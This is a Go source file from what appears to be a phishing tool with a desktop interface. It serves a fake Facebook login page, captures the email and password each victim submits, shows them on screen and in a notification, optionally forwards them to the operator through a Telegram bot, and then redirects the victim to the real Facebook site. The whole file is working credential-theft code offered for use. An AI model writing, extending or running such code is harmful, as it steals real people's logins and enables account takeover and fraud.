package main

import (
	"context"
	"fmt"
	"net/http"
	"regexp"
	"strings"

	"github.com/raifpy/Go/errHandler"

	"fyne.io/fyne"
	"fyne.io/fyne/dialog"
	"fyne.io/fyne/widget"
)

// 3.party
var emailRegex = regexp.MustCompile("^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$")

// isEmailValid checks if the email provided passes the required structure and length.
func isEmailValid(e string) bool {
	if len(e) < 3 && len(e) > 254 {
		return false
	}
	return emailRegex.MatchString(e)
}

//

func serveFacebookLogin(kapat chan bool, win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
	serveFunc := func(response http.ResponseWriter, request *http.Request) {
		fmt.Fprintln(response, faceLoginHTML)
	}
	serveFuncLogin := func(response http.ResponseWriter, request *http.Request) {
		request.ParseForm()
		email := request.FormValue("email")
		pass := request.FormValue("pass")

		if email == "" || !isEmailValid(email) {
			fmt.Fprintln(response, facebookwrongemailHTML)
			return
		} else if pass == "" {
			fmt.Fprintln(response, strings.Replace(facebookunpassHTML, "&&email&&", email, 1))
			return
		}
		*textStream += "Email = " + email + "\nPass = " + pass + "\n"
		if useTelegramBot {
			tg.send("Email = " + email + "\nPass = " + pass)
		}
		notiApp.SendNotification(fyne.NewNotification("New Form", email+" : "+pass))
		textGrid.SetText(*textStream)
		http.Redirect(response, request, "https://facebook.com", 301)
	}

	m := http.NewServeMux()
	s := http.Server{Addr: ":8089", Handler: m}
	m.HandleFunc("/", serveFunc)
	http.HandleFunc("/login", serveFuncLogin)

	go func() {
		<-kapat
		s.Shutdown(context.Background())

	}()
	if err := s.ListenAndServe(); errHandler.HandlerBool(err) {
		if useTelegramBot {
			tg.send(err.Error())
		}
		dialog.ShowError(err, win)
	}

	//http.HandleFunc("/", serverFunc)

	//http.ListenAndServe(":8089", nil)

}
